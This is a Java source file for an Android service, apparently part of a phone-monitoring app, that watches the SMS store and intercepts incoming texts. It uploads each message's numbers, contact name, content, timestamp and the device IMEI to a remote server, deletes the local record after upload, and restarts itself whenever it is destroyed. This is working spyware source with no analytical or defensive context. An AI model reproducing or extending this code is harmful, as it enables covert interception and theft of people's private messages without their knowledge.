package com.privacy.monitor.service;

import java.util.ArrayList;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.SMSRecordDB;
import com.privacy.monitor.domain.SMSRecord;
import com.privacy.monitor.inte.RunBack;
import com.privacy.monitor.receiver.SMSReceiver;
import com.privacy.monitor.resolver.SMSObserver;
import com.privacy.monitor.resolver.field.SMSConstant;
import com.privacy.monitor.resolver.handler.SMSHandler;
import com.privacy.monitor.util.AlarmNanagerUtil;
import com.privacy.monitor.util.AppUtil;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;

/**
 * 短信监听服务
 */
public class SMSMonitoringService extends Service {

	private static final String TAG = SMSMonitoringService.class.getSimpleName();
	private SMSObserver smsObserver;
	private SMSRecordDB sqlite ;
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		
			Logger.d(TAG, "短信监听服务启动了");
			ContentResolver smsResolver = getContentResolver();
			smsObserver = new SMSObserver(smsResolver, new SMSHandler(this),getApplicationContext(),new MyRunBack());
			smsResolver.registerContentObserver(SMSConstant.CONTENT_URI,true,smsObserver);	
			IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
			intentFilter.setPriority(Integer.MAX_VALUE);
			getApplicationContext().registerReceiver(new SMSReceiver(), intentFilter);
		    AlarmNanagerUtil.startCron(getApplicationContext());
	}
	
	@Override
	public void onDestroy() {
		 Logger.d(TAG,"sms服务销毁");
		 Intent intent = new Intent(this,SMSMonitoringService.class);
         startService(intent);
         if(smsObserver !=null){
        	 getContentResolver().unregisterContentObserver(smsObserver);
         }
		super.onDestroy();
	}
	
	private class MyRunBack implements RunBack{

		@Override
		public void run() {
			sqlite = SMSRecordDB.getInstance(getApplicationContext());
			if(HttpUtil.detect(getApplicationContext())){
			uploadData(sqlite);
			}
		}

		private void uploadData(SMSRecordDB smsRecordDB) {
			ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS +" = ? ",new String []{"0"});
				if(list !=null){
					for (SMSRecord smsRecord : list) {
						uploadSmsInfo(smsRecord);
				}
			}
		}
		
		private void uploadSmsInfo(SMSRecord smsRecord) {
			SharedPreferences sp = getApplicationContext().getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
			String updateDate = "my_num="+sp.getString(C.PHONE,"")+"&you_num="+smsRecord.getPhone()+"&time="+smsRecord.getDateSent()+"&content="+smsRecord.getMessageContent()+"&type="+smsRecord.getType()+"&sim_id="+AppUtil.getIMEI(getApplicationContext())+"&you_name="+smsRecord.getName();
			String updateResult= AppUtil.streamToStr(NetworkUtil.upload(getApplicationContext(),updateDate,C.RequestMethod.uploadSMS));
			if("ok".equalsIgnoreCase(updateResult)){
				sqlite.delete(SMSRecord.COL_DATE +" = ?",new String []{smsRecord.getDateSent()});
			}
		}

		@Override
		public void run(Object object) {
			// TODO Auto-generated method stub
			
		}
	}
}
